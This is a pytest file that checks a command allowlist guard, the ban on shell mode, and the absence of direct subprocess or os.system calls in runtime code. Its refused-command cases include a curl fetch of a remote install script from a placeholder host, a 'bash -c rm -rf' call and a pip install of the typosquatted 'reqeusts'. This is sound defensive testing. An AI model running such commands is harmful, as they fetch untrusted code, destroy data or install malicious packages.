import ast
import sys
from pathlib import Path

import pytest

from security.commands import CommandNotAllowed, run

ROOT = Path(__file__).resolve().parents[2]
RUNTIME = ["backend", "mcp_servers", "security"]


def test_allowed_programs_run():
    assert run(["git", "--version"]).stdout.startswith("git version")
    assert run([sys.executable, "-m", "ruff", "--version"]).returncode == 0


@pytest.mark.parametrize("cmd", [
    ["curl", "-s", "http://setup.tinyshop-tools.example/install.sh"],
    ["sh", "-c", "echo hi"],
    ["bash", "-c", "rm -rf /tmp/x"],
    [sys.executable, "-c", "print(1)"],
    [sys.executable, "-m", "pip", "install", "reqeusts"],
    ["/usr/bin/git", "status"],
    [],
])
def test_everything_else_is_refused(cmd):
    with pytest.raises(CommandNotAllowed):
        run(cmd)


def test_shell_mode_cannot_be_requested():
    with pytest.raises(TypeError):
        run(["git", "--version"], shell=True)


def test_runtime_code_runs_commands_only_through_the_guard():
    offenders = []
    for package in RUNTIME:
        for path in (ROOT / package).rglob("*.py"):
            rel = path.relative_to(ROOT).as_posix()
            if "/tests/" in rel or rel == "security/commands.py":
                continue
            for node in ast.walk(ast.parse(path.read_text())):
                if isinstance(node, ast.Import) and any(a.name.split(".")[0] == "subprocess" for a in node.names):
                    offenders.append(f"{rel}: import subprocess")
                if isinstance(node, ast.ImportFrom) and (node.module or "").split(".")[0] == "subprocess":
                    offenders.append(f"{rel}: from subprocess import")
                if (isinstance(node, ast.Attribute) and isinstance(node.value, ast.Name) and node.value.id == "os"
                        and node.attr.startswith(("system", "popen", "exec", "spawn"))):
                    offenders.append(f"{rel}: os.{node.attr}")
    assert offenders == []
